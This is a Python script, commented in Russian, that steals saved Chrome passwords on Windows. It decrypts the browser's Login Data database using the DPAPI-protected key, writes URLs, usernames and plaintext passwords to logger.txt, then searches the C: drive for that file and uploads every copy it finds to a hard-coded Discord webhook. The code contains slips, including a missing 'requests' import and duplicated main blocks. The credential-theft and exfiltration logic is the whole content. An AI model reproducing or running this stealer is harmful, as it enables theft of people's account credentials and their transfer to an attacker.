import os
import sqlite3
import shutil
from Crypto.Cipher import AES
import win32crypt

def get_chrome_passwords():
    local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
    login_db_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    temp_db = 'ChromeData.db'
    
    shutil.copy2(login_db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    
    with open(local_state_path, 'r') as f:
        import json
        local_state = json.load(f)
        key = local_state['os_crypt']['encrypted_key']
        key = win32crypt.CryptUnprotectData(key[5:])[1]
    
    results = []
    for url, username, encrypted_pw in cursor.fetchall():
        if username and encrypted_pw:
            iv = encrypted_pw[3:15]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_pw[15:-16]).decode()
            results.append(f"{url}\n{username}:{decrypted}\n")
    
    conn.close()
    os.remove(temp_db)
    return results

if __name__ == '__main__':
    data = get_chrome_passwords()
    with open('logger.txt', 'w', encoding='utf-8') as f:
        f.writelines(data)
    print(f"[+] Сохранено {len(data)} записей в logger.txt")
    WEBHOOK_URL = "https://discord.com/api/webhooks/1490724807971573880/ZBtoMfsjMW6pheWLQR7J_nCGxT8pukcEAcbcp3c_9YFVIPuoX655ebZEqQQup6cxUjRG"  # ЗАМЕНИТЬ

def find_and_send(filename="logger.txt"):
    found_paths = []
    
    # Поиск по всему диску C: (можно изменить)
    for root, dirs, files in os.walk("C:\\"):
        if filename in files:
            path = os.path.join(root, filename)
            found_paths.append(path)
            print(f"[+] Найден: {path}")
    
    # Отправка в Discord
    for path in found_paths:
        try:
            with open(path, "rb") as f:
                files = {"file": (os.path.basename(path), f)}
                data = {"content": f"📁 Найден файл: {path}"}
                requests.post(WEBHOOK_URL, files=files, data=data)
            print(f"[+] Отправлен: {path}")
        except Exception as e:
            print(f"[-] Ошибка {path}: {e}")

if __name__ == "__main__":
    find_and_send()